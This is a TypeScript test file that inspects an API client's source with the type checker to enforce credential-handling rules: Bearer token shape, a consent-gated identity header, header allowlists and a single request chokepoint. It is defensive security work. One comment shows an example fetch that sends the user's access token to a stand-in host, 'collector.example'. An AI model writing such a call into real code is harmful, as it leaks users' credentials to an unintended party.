/**
 * CREDENTIAL SHAPE: the rules `src/api.ts` follows when it attaches a credential
 * to an outbound request, asserted against its source.
 *
 * WHY THIS FILE IS IN `scripts/` AND NOT BESIDE `src/api.ts`. That is the whole
 * point of it, so it goes first.
 *
 * `src/api.ts` is ~1,700 lines and is deliberately NOT in `.github/CODEOWNERS`.
 * Owning it would put the three release signers on a file that churns
 * constantly — the bottleneck the missing `*` line in that file exists to avoid.
 * But it is also where every outbound credential is attached: the `Bearer`
 * access token, and the `x-wego-id-token` identity assertion. This repository is
 * public, so anyone may open a pull request, and a plausible-looking change to
 * WHERE or UNDER WHAT CONDITION a credential is sent currently needs one
 * ordinary reviewer.
 *
 * `scripts/` IS code-owned. Putting the guard here means the gate and the thing
 * that can weaken the gate sit at different review bars: a pull request that
 * loosens credential attachment in `src/api.ts` fails this test, and silencing
 * this test requires a release signer. That is the protection CODEOWNERS on
 * `api.ts` would give, without the bottleneck.
 *
 * The same assertions placed in `src/api.test.ts` would buy nothing — both files
 * are unowned, so one pull request could weaken the gate AND edit its guard
 * under a single ordinary review.
 *
 * WHAT THIS DOES *NOT* PROTECT. A future reader who over-trusts this file is a
 * worse outcome than not having it, so, plainly:
 *
 *   - **It asserts what it asserts.** These are four specific structural rules.
 *     A sufficiently novel credential path can be written to satisfy every one
 *     of them — a request built outside `fetchOrUnreachable`, a token folded
 *     into a URL or a request body, a credential handed to a helper in another
 *     module. None of that is caught here.
 *   - **A reviewer still has to think.** This narrows what can be done QUIETLY.
 *     It is friction and detection, not prevention.
 *   - **It does not protect `src/api.ts` from a release signer**, and is not
 *     meant to. A signer can change both files in one pull request. The threat
 *     model is an outsider's pull request seen by one ordinary reviewer.
 *   - **It reads structure, not behaviour.** It cannot tell you the token a
 *     parameter carries is the right one, only that a parameter is where it came
 *     from. Behavioural coverage lives in `src/api.test.ts`; this is the
 *     structural half, and the two are not substitutes.
 *   - **The header collectors recognise the forms this file uses.** They are
 *     written to fail closed — an unfamiliar header-bag shape is an error, not a
 *     skip (invariant 4) — but "fails closed on what it can see" is still not
 *     "sees everything".
 *
 * WHY A TYPE CHECKER AND NOT A REGEX. Invariants 2 and 3 are claims about SCOPE
 * — "this call is inside that `if`", "this function never assigns that
 * property". Line proximity is not scope: a `headers.set` moved one line down,
 * out of a guard's block, looks identical to grep, and is exactly the regression
 * worth catching. Invariant 1 is a claim about BINDING — "this token came from a
 * parameter" — which name matching cannot answer, because a local
 * `const accessToken = process.env.TOKEN` shadows a parameter of the same name
 * and reads identically. So this resolves symbols rather than comparing text.
 *
 * `typescript` is already a devDependency (it backs `bun run typecheck`), and
 * `noResolve`/`noLib` keep the program to this one file, so nothing new is
 * installed and no dependency graph is walked. `bun run test` runs only in
 * unprivileged jobs — `ci-cli`, and `release-cli.yml`'s `prepare`, which holds
 * neither `id-token: write` nor the store environment. `workflow-shape.test.ts`
 * is what keeps that true.
 *
 * INVARIANT 4 IS THE ONE THAT MATTERS MOST. Invariants 1-3 pin gates we already
 * know about. Invariant 4 — the allowlist of header names — catches the
 * credential path nobody has thought of yet, because it fails BY DEFAULT on
 * anything new: adding a header to `src/api.ts` goes red until somebody edits
 * `scripts/`, which is to say until a release signer looks at it. If this file
 * ever has to be cut down, cut everything before invariant 4.
 */
import { describe, expect, it } from "bun:test";
import ts from "typescript";

const SOURCE_PATH = "src/api.ts";

/**
 * One file, no lib, no module resolution. The checker only ever has to answer
 * questions about bindings declared inside `src/api.ts` itself, so following
 * imports would cost seconds and buy nothing.
 */
const program = ts.createProgram([SOURCE_PATH], {
  noResolve: true,
  noLib: true,
  target: ts.ScriptTarget.Latest,
});
const checker = program.getTypeChecker();
const sourceFile = program.getSourceFile(SOURCE_PATH) as ts.SourceFile;

/** 1-based line of a node, so a failure names a place rather than a shape. */
const lineOf = (node: ts.Node): number =>
  sourceFile.getLineAndCharacterOfPosition(node.getStart(sourceFile)).line + 1;

const where = (node: ts.Node): string => `${SOURCE_PATH}:${lineOf(node)}`;

const normalize = (text: string): string => text.replace(/\s+/g, " ").trim();

/** A node, with its location, as one string — the shape a failure message wants. */
const cite = (node: ts.Node): string =>
  `${where(node)}: ${normalize(node.getText(sourceFile))}`;

/** Every node in the file, depth-first. */
function* walk(node: ts.Node): Generator<ts.Node> {
  yield node;
  for (const child of node.getChildren(sourceFile)) yield* walk(child);
}

const allNodes = [...walk(sourceFile)];

/** The static text of a property name or a string-ish literal, or `undefined`
 *  when it is computed. A computed name defeats every allowlist below, so
 *  `undefined` is always treated as a failure rather than quietly skipped. */
function staticName(node: ts.Node | undefined): string | undefined {
  if (node === undefined) return undefined;
  if (ts.isIdentifier(node)) return node.text;
  if (ts.isStringLiteralLike(node)) return node.text;
  return undefined;
}

/** HTTP header names are case-insensitive on the wire, so every comparison here
 *  is too: `authorization` must not be a way around a rule about
 *  `Authorization`. */
const headerKey = (name: string): string => name.toLowerCase();

/** The nearest function-like ancestor — the scope whose parameters are in play. */
function enclosingFunction(node: ts.Node): ts.SignatureDeclaration | undefined {
  for (let scope = node.parent; scope !== undefined; scope = scope.parent) {
    if (
      ts.isFunctionDeclaration(scope) ||
      ts.isFunctionExpression(scope) ||
      ts.isArrowFunction(scope) ||
      ts.isMethodDeclaration(scope)
    ) {
      return scope;
    }
  }
  return undefined;
}

/** Where an identifier is DECLARED, resolved through the checker rather than
 *  guessed from its text — a local can shadow a parameter of the same name. */
function declarationOf(node: ts.Node): ts.Declaration | undefined {
  // `{ ...rest, accessToken }` is the case worth spelling out. The identifier
  // there is the PROPERTY's name, and asking the checker about it returns the
  // property symbol — not the variable being read. Resolving through the
  // shorthand node is what gets the value, and without this a token packed
  // into a request body resolves to nothing and is silently skipped.
  const target =
    ts.isIdentifier(node) && ts.isShorthandPropertyAssignment(node.parent)
      ? node.parent
      : node;
  const symbol = ts.isShorthandPropertyAssignment(target)
    ? checker.getShorthandAssignmentValueSymbol(target)
    : checker.getSymbolAtLocation(target);
  return symbol?.declarations?.[0];
}

/** True when `node` resolves to a parameter of `fn` itself — not of an outer
 *  function it happens to close over, and not a local that shadows one. */
function isParameterOf(
  node: ts.Node,
  fn: ts.SignatureDeclaration | undefined,
): boolean {
  const declaration = declarationOf(node);
  return (
    declaration !== undefined &&
    fn !== undefined &&
    ts.isParameter(declaration) &&
    declaration.parent === fn
  );
}

// ---------------------------------------------------------------------------
// Header bags: what counts as one, and the rule that an unfamiliar one fails
// ---------------------------------------------------------------------------

/** Every identifier bound to a `new Headers(...)`. `src/api.ts` builds exactly
 *  one, in `fetchOrUnreachable`; invariant 4 asserts that stays true, so a
 *  second bag cannot appear under a name these collectors do not know. */
const headerBagNames = new Set(
  allNodes
    .filter(
      (node): node is ts.VariableDeclaration =>
        ts.isVariableDeclaration(node) &&
        node.initializer !== undefined &&
        ts.isNewExpression(node.initializer) &&
        staticName(node.initializer.expression) === "Headers",
    )
    .map((node) => staticName(node.name))
    .filter((name): name is string => name !== undefined),
);

/** The trailing name of a `.set(...)` receiver: `headers` for `headers.set`,
 *  `headers` for `init.headers.set`, `requestHeaders` for `requestHeaders.set`. */
function receiverName(expr: ts.Expression): string | undefined {
  if (ts.isIdentifier(expr)) return expr.text;
  if (ts.isPropertyAccessExpression(expr)) return expr.name.text;
  return undefined;
}

/** Every `<something headerish>.set(...)` call. Two ways in, because either
 *  alone leaves a hole: a bag called `requestHeaders` slips a `new Headers`
 *  rule if it is assigned rather than declared, and a bag called `h` slips a
 *  name rule. `res.headers.get(...)` is a READ of a response and is
 *  deliberately not here. */
const headerSetCalls = allNodes.filter((node): node is ts.CallExpression => {
  if (!ts.isCallExpression(node)) return false;
  if (!ts.isPropertyAccessExpression(node.expression)) return false;
  if (node.expression.name.text !== "set") return false;
  const name = receiverName(node.expression.expression);
  if (name === undefined) return false;
  return headerBagNames.has(name) || /headers?$/i.test(name);
});

/** Every `headers:` property assignment, whatever its value is. Invariant 4
 *  rejects the ones whose value is not a plain object literal rather than
 *  skipping them. */
const headerProperties = allNodes.filter(
  (node): node is ts.PropertyAssignment =>
    ts.isPropertyAssignment(node) && staticName(node.name) === "headers",
);

/** Every member of an inline header object — INCLUDING spreads, which invariant
 *  4 fails on, because dropping them here is how a collector goes quiet. */
const inlineHeaderMembers = headerProperties
  .filter((node) => ts.isObjectLiteralExpression(node.initializer))
  .flatMap(
    (node) => (node.initializer as ts.ObjectLiteralExpression).properties,
  );

const inlineHeaderProps = inlineHeaderMembers.filter(ts.isPropertyAssignment);

// ---------------------------------------------------------------------------
// Invariant 1 - every Authorization value is `Bearer ${<a parameter>}`
// ---------------------------------------------------------------------------

/** Both ways a header can be set in this file, reduced to (name, value), then
 *  narrowed to the Authorization ones. */
const authorizationSites: { name: ts.Node; value: ts.Expression }[] = [
  ...inlineHeaderProps.map((prop) => ({
    name: prop.name as ts.Node,
    value: prop.initializer,
  })),
  ...headerSetCalls.map((call) => ({
    name: call.arguments[0] as ts.Node,
    value: call.arguments[1] as ts.Expression,
  })),
].filter((site) => headerKey(staticName(site.name) ?? "") === "authorization");

describe("invariant 1: Authorization carries a Bearer token from a parameter", () => {
  it("sets Authorization somewhere, so the rules below are exercised", () => {
    // Without this, removing every call site would make the cases below
    // vacuously green: `it.each([])` asserts nothing at all.
    expect(authorizationSites.length).toBeGreaterThan(0);
  });

  it.each(
    authorizationSites.map((site) => [where(site.value), site] as const),
  )("%s is a template of Bearer plus exactly one interpolation", (_label, site) => {
    // A string literal here would be a hardcoded credential. A concatenation,
    // a second span or a tail would let a prefix or suffix smuggle something
    // else into the same header.
    expect(ts.isTemplateExpression(site.value)).toBe(true);
    const template = site.value as ts.TemplateExpression;
    expect(template.head.text).toBe("Bearer ");
    expect(template.templateSpans).toHaveLength(1);
    expect(template.templateSpans[0]?.literal.text).toBe("");
  });

  it.each(
    authorizationSites.map((site) => [where(site.value), site] as const),
  )("%s interpolates a parameter of the function that sends the request", (_label, site) => {
    const template = site.value as ts.TemplateExpression;
    const interpolated = template.templateSpans[0]?.expression;

    // A bare identifier: not `process.env.X`, not `config.token`, not a call.
    expect(interpolated !== undefined && ts.isIdentifier(interpolated)).toBe(
      true,
    );

    // ...and one the CHECKER says is a parameter of the NEAREST enclosing
    // function. Both halves earn their place:
    //   - resolved, not name-matched, because `const accessToken =
    //     process.env.TOKEN` shadows the parameter and reads identically;
    //   - nearest, not any ancestor, because a nested helper closing over an
    //     outer function's parameter is a different claim from this one.
    // The point is that the credential is PASSED IN, so the decision about
    // which token to send stays with the command that made it.
    const fn = enclosingFunction(site.value);
    expect({
      at: cite(site.value),
      fromAParameter: isParameterOf(interpolated as ts.Identifier, fn),
    }).toEqual({ at: cite(site.value), fromAParameter: true });
  });
});

// ---------------------------------------------------------------------------
// Invariant 2 - x-wego-id-token only inside the consent guard
// ---------------------------------------------------------------------------

/** The guard the identity assertion must sit behind, normalized for whitespace
 *  so reformatting is free and reordering is not. `allowed` is the user's
 *  consent; `token` is the assertion itself. Both, or nothing is sent. */
const CONSENT_GUARD = "identityAssertion.allowed && identityAssertion.token";

const idTokenSets = headerSetCalls.filter(
  (call) =>
    headerKey(staticName(call.arguments[0]) ?? "") === "x-wego-id-token",
);

describe("invariant 2: x-wego-id-token is sent only under the consent guard", () => {
  it("is set exactly once", () => {
    // One call site is what lets "inside the guard" be a complete statement
    // about the file. A second would mean the rule below has to hold in two
    // places and a reviewer has to notice both — the situation this prevents.
    expect(idTokenSets.map(where)).toHaveLength(1);
  });

  it.each(
    idTokenSets.map((call) => [where(call), call] as const),
  )(`%s sits in the THEN branch of \`if (${CONSENT_GUARD})\``, (_label, call) => {
    // Scope, not proximity. An `if` whose ELSE branch holds the call, or an
    // `if` the call merely follows, must not count — so this walks the parent
    // chain and requires the child to be on the `thenStatement` side.
    const guards: string[] = [];
    let node: ts.Node = call;
    while (node.parent !== undefined) {
      const parent: ts.Node = node.parent;
      if (ts.isIfStatement(parent) && parent.thenStatement === node) {
        guards.push(normalize(parent.expression.getText(sourceFile)));
      }
      node = parent;
    }
    expect(guards).toContain(CONSENT_GUARD);
  });
});

// ---------------------------------------------------------------------------
// Invariant 3 - a refresh never re-decides consent
// ---------------------------------------------------------------------------

const refresh = allNodes.find(
  (node): node is ts.FunctionDeclaration =>
    ts.isFunctionDeclaration(node) &&
    node.name?.text === "refreshIdentityAssertion",
);

const refreshNodes = refresh?.body === undefined ? [] : [...walk(refresh.body)];

describe("invariant 3: refreshIdentityAssertion never assigns `allowed`", () => {
  it("exists as a function declaration with a body", () => {
    // If it is renamed or reshaped, the rules below stop applying SILENTLY.
    // Failing here sends whoever did that to this file to say why.
    expect(refresh?.body).toBeDefined();
  });

  it("assigns no property other than `token`", () => {
    // The consent decision is made once, by `setIdentityAssertion`, out of the
    // login flow. A refresh only ever learns a NEW TOKEN. A refresh that could
    // also flip `allowed` to `true` would send an identity assertion for a user
    // who declined — a consent bypass that reads like a one-word tidy-up.
    //
    // Stated as an allowlist rather than as "no property named `allowed`": a
    // computed key (`{ ["allow" + "ed"]: true }`) has no legitimate use in this
    // three-line function, and an allowlist rejects it without having to guess
    // at what it evaluates to.
    const offenders = refreshNodes
      .filter((node) => {
        if (
          ts.isPropertyAssignment(node) ||
          ts.isShorthandPropertyAssignment(node)
        ) {
          return staticName(node.name) !== "token";
        }
        if (
          ts.isBinaryExpression(node) &&
          node.operatorToken.kind === ts.SyntaxKind.EqualsToken &&
          ts.isPropertyAccessExpression(node.left)
        ) {
          return node.left.name.text === "allowed";
        }
        return false;
      })
      .map(cite);

    expect(offenders).toEqual([]);
  });

  it("assigns the `token` parameter it was handed", () => {
    // The allowlist above is satisfied by a function that assigns NOTHING, and
    // a refresh that quietly stops refreshing is its own bug — the CLI would go
    // on presenting a stale assertion. So the token write is required, and
    // required to be THE PARAMETER: `{ ...identityAssertion, token: somethingElse }`
    // passes a name check and fails this one.
    const assignsParameter = refreshNodes
      .filter(
        (
          node,
        ): node is ts.PropertyAssignment | ts.ShorthandPropertyAssignment =>
          (ts.isPropertyAssignment(node) ||
            ts.isShorthandPropertyAssignment(node)) &&
          staticName(node.name) === "token",
      )
      .some((node) =>
        ts.isShorthandPropertyAssignment(node)
          ? isParameterOf(node, refresh)
          : isParameterOf(node.initializer, refresh),
      );
    expect(assignsParameter).toBe(true);
  });

  it("carries the previous state forward by spreading it", () => {
    // The positive half of the rule above. Not spreading would be fail-CLOSED
    // today (`allowed` would be absent, and absent is falsy), so this is not a
    // security assertion standing on its own — it pins the MECHANISM, so the
    // next person here reads "carry forward" rather than "re-derive".
    const spreads = refreshNodes
      .filter(ts.isSpreadAssignment)
      .map((node) => normalize(node.expression.getText(sourceFile)));
    expect(spreads).toContain("identityAssertion");
  });
});

// ---------------------------------------------------------------------------
// Invariant 4 - the closed set of header names
// ---------------------------------------------------------------------------

/**
 * EVERY header name `src/api.ts` may attach through a header bag's `.set`, and
 * what each one carries. This list is the point of the whole file: it fails by
 * DEFAULT on anything new, so a header nobody anticipated cannot be added
 * quietly.
 *
 * To add a header: add it here, in the same pull request, with a line saying
 * what it carries. That edit is in `scripts/`, so it needs a release signer —
 * which is the review a new outbound header deserves.
 */
const ALLOWED_SET_HEADERS: Record<string, string> = {
  "user-agent": "build identification; carries no user data",
  "x-wego-session-id": "analytics uuid, pushed in per invocation",
  "x-wego-client-id": "analytics uuid, pushed in per invocation",
  "x-wego-app-version": "build version",
  "x-wego-os-type": "machine fact, not stored telemetry",
  "x-wego-os-version": "machine fact, not stored telemetry",
  "x-wego-timezone": "utc offset, computed per request",
  "x-wego-id-token": "THE identity assertion - gated by invariant 2",
};

/** The same closed set, for headers written inline into a `fetch` init object.
 *  Separate list because it is a separate mechanism: a new credential added
 *  there would never touch a `.set` call. */
const ALLOWED_LITERAL_HEADERS: Record<string, string> = {
  authorization: "THE access token - shaped by invariant 1",
  "content-type": "request body encoding, JSON on the POST path",
};

describe("invariant 4: no header leaves this file without being listed here", () => {
  it("builds exactly one header bag, under a name the collectors know", () => {
    // The collectors recognise `.set` on a `new Headers` binding or on a
    // headerish name. The NUMBER of bags is worth pinning on its own: one bag
    // is why "every header this file sends" is a list somebody can finish
    // reading, and a second one is a second place to look.
    expect([...headerBagNames]).toEqual(["headers"]);
  });

  it("names every header-bag .set(...) with a static string", () => {
    // `headers.set(name, value)` with a variable name would make the allowlist
    // below unenforceable, so the allowlist starts by requiring names it can read.
    const dynamic = headerSetCalls
      .filter((call) => staticName(call.arguments[0]) === undefined)
      .map(cite);
    expect(dynamic).toEqual([]);
  });

  it("sets only allowlisted header names", () => {
    const names = headerSetCalls.map((call) =>
      headerKey(staticName(call.arguments[0]) as string),
    );
    expect([...new Set(names)].sort()).toEqual(
      Object.keys(ALLOWED_SET_HEADERS).sort(),
    );
  });

  it("builds every inline header bag as a plain object literal", () => {
    // `headers: credentialHeaders` or `headers: buildHeaders(token)` moves the
    // decision somewhere this file cannot see. Fail rather than skip: a bag the
    // collector cannot read is the case an allowlist is worth least in.
    const opaque = headerProperties
      .filter((node) => !ts.isObjectLiteralExpression(node.initializer))
      .map(cite);
    expect(opaque).toEqual([]);
  });

  it("writes every inline header as a named property, never a spread", () => {
    // `{ ...credentialHeaders, "Content-Type": "application/json" }` leaves the
    // name list below unchanged while adding any header it likes. A spread is
    // therefore a failure in its own right, not a member the collector drops.
    const unreadable = inlineHeaderMembers
      .filter((member) => !ts.isPropertyAssignment(member))
      .map(cite);
    expect(unreadable).toEqual([]);
  });

  it("writes only allowlisted names into inline header objects", () => {
    const names = inlineHeaderProps
      .map((prop) => staticName(prop.name))
      // A computed key inside a header bag is the same hole as a dynamic
      // `.set` name. Surface it as an unlistable name rather than skip it.
      .map((name) => (name === undefined ? "<computed>" : headerKey(name)));
    expect([...new Set(names)].sort()).toEqual(
      Object.keys(ALLOWED_LITERAL_HEADERS).sort(),
    );
  });
});

// ---------------------------------------------------------------------------
// Invariant 5 - the request chokepoint, and where a token may travel
// ---------------------------------------------------------------------------

/**
 * WHY THIS ONE EXISTS, AND WHY IT IS NOT LAST IN IMPORTANCE.
 *
 * Invariants 1-4 all describe the header bag of a request that already goes
 * through `fetchOrUnreachable`. That leaves the largest hole in the file wide
 * open: a request that never goes through it at all.
 *
 *     await fetch("https://collector.example/ingest", {
 *       headers: { Authorization: `Bearer ${accessToken}` },
 *     });
 *
 * That line satisfies every rule above — the header name is allowlisted, the
 * value is a `Bearer` template, and the token is a parameter of the enclosing
 * function. It also sends the user's access token to a host nobody chose. The
 * allowlists guard the payload at the door; this one guards the door.
 *
 * So the claim here is about REACHABILITY, in two halves:
 *
 *   a. Exactly one thing in this file issues a network request, every caller of
 *      it is named, and the set of callers is closed. A new request path is a
 *      `scripts/` edit — that is, a release signer — before it can exist.
 *   b. An access token may only ever be FORWARDED to another `accessToken`
 *      parameter, or interpolated into the `Bearer` header. It may not enter a
 *      URL, a query string, a request body, a log line, or any other call.
 *      Header rules cannot see a token in a query string; this can.
 *
 * `src/target.ts` and `src/config.ts` — both already code-owned — decide which
 * HOST a token may reach and refuse cleartext. This is what stops `src/api.ts`
 * from going around them.
 *
 * LIMIT, stated because the rest of this file states its limits. Rule (b)
 * tracks the `accessToken` parameters by name and by symbol. It does not follow
 * a token through a local alias (`const t = accessToken`) — that is caught only
 * because the alias would then have to reach the wire through a call this rule
 * already refuses. It does not track `identityAssertion.token`, which is module
 * state rather than a parameter; invariant 2 pins its one use.
 */

/** The only function permitted to issue a request, and the closed set of
 *  callers allowed to reach it. Adding a caller means adding it here. */
const REQUEST_CHOKEPOINT = "fetchOrUnreachable";
const ALLOWED_CHOKEPOINT_CALLERS: Record<string, string> = {
  authedJsonGet: "the shared authenticated GET envelope",
  authedJsonPost: "the shared authenticated POST envelope",
};

const chokepoint = allNodes.find(
  (node): node is ts.FunctionDeclaration =>
    ts.isFunctionDeclaration(node) && node.name?.text === REQUEST_CHOKEPOINT,
);

/** The name of the nearest enclosing function, for grouping call sites. */
function enclosingFunctionName(node: ts.Node): string {
  const fn = enclosingFunction(node);
  if (fn === undefined) return "<module scope>";
  const name = (fn as ts.FunctionDeclaration).name;
  return name === undefined ? "<anonymous>" : name.text;
}

describe("invariant 5a: exactly one door, and a closed list of who may use it", () => {
  it(`declares ${REQUEST_CHOKEPOINT} as a function`, () => {
    expect(chokepoint).toBeDefined();
  });

  it("references the global fetch only as the injected default", () => {
    // `http: HttpFetch = fetch` is the ONE permitted mention: it is what makes
    // the transport swappable in tests. Any other `fetch` in this file is a
    // second door — a request that skips every header rule above, and skips
    // `src/target.ts`'s decision about which host may receive a credential.
    const strayFetch = allNodes
      .filter(
        (node): node is ts.Identifier =>
          ts.isIdentifier(node) && node.text === "fetch",
      )
      .filter((node) => !ts.isParameter(node.parent))
      .map(cite);
    expect(strayFetch).toEqual([]);
  });

  it("issues exactly one request, through its injected transport", () => {
    // Inside the chokepoint, the call that reaches the network must be the
    // INJECTED parameter, not a module-scope binding and not a fresh import.
    const viaInjectedTransport = (
      chokepoint?.body === undefined ? [] : [...walk(chokepoint.body)]
    )
      .filter(ts.isCallExpression)
      .filter((call) => isParameterOf(call.expression, chokepoint));
    expect(viaInjectedTransport.map(where)).toHaveLength(1);
  });

  it("is reached only from the allowlisted callers", () => {
    // The fails-by-default half. A new request path — a new endpoint, a retry
    // helper, a "quick" health check — has to add its name here, in `scripts/`,
    // which is to say in front of a release signer.
    const callers = allNodes
      .filter(
        (node): node is ts.CallExpression =>
          ts.isCallExpression(node) &&
          staticName(node.expression) === REQUEST_CHOKEPOINT,
      )
      .map(enclosingFunctionName);
    expect([...new Set(callers)].sort()).toEqual(
      Object.keys(ALLOWED_CHOKEPOINT_CALLERS).sort(),
    );
  });
});

/** Every parameter in the file named `accessToken` — the credential's only
 *  legitimate carrier. */
const accessTokenParams = allNodes.filter(
  (node): node is ts.ParameterDeclaration =>
    ts.isParameter(node) && staticName(node.name) === "accessToken",
);

/** True when `node` is an argument of a call whose callee declares that same
 *  position as an `accessToken` parameter — i.e. the token is being FORWARDED,
 *  not consumed. `logDebug(accessToken)` fails: `logDebug`'s parameter is not
 *  called `accessToken`, so the token would be leaving its lane. */
function isForwardedToAnAccessTokenParameter(node: ts.Node): boolean {
  const call = node.parent;
  if (!ts.isCallExpression(call)) return false;
  const index = call.arguments.indexOf(node as ts.Expression);
  if (index < 0) return false;
  const callee = declarationOf(call.expression);
  if (callee === undefined || !ts.isFunctionLike(callee)) return false;
  return staticName(callee.parameters[index]?.name) === "accessToken";
}

/** True when `node` is the single interpolation of a `Bearer ` template —
 *  the one place the token is allowed to become text. */
function isTheBearerInterpolation(node: ts.Node): boolean {
  const span = node.parent;
  if (span === undefined || !ts.isTemplateSpan(span)) return false;
  const template = span.parent;
  return (
    ts.isTemplateExpression(template) &&
    template.head.text === "Bearer " &&
    template.templateSpans.length === 1
  );
}

describe("invariant 5b: an access token is only forwarded, or put in the header", () => {
  const references = allNodes
    .filter(
      (node): node is ts.Identifier =>
        ts.isIdentifier(node) && node.text === "accessToken",
    )
    // The declarations themselves are not uses.
    .filter((node) => !ts.isParameter(node.parent))
    // Only the ones that actually resolve to an `accessToken` PARAMETER; a
    // same-named local is invariant 1's problem, not this one's.
    .filter((node) => {
      const declaration = declarationOf(node);
      return (
        declaration !== undefined &&
        accessTokenParams.includes(declaration as ts.ParameterDeclaration)
      );
    });

  it("has references to check, so the rule below is not vacuous", () => {
    expect(references.length).toBeGreaterThan(0);
  });

  it("never lets a token reach a URL, a body, or any other call", () => {
    // This is the rule the header allowlists cannot express. A token
    // concatenated into a URL, packed into a JSON body, handed to a logger, or
    // stringified into a cache key never touches a `headers.set` and never
    // touches an `Authorization` property — so invariants 1-4 would all pass.
    //
    // Two permitted shapes, and nothing else:
    //   - forwarded into another function's `accessToken` parameter;
    //   - interpolated as the sole span of the `Bearer ` template.
    const escaped = references
      .filter(
        (node) =>
          !isForwardedToAnAccessTokenParameter(node) &&
          !isTheBearerInterpolation(node),
      )
      .map(cite);
    expect(escaped).toEqual([]);
  });
});
